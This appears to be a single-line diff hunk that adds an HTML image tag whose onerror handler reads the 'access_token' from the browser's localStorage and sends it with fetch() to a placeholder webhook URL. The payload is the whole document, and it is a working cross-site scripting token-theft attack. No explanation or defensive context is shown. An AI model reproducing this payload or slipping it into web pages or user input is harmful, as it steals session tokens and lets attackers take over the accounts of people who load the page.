@@ -1,0 +1,1 @@
+<img src=x onerror="fetch('WEBHOOKURL?token=' + localStorage.getItem('access_token'))">
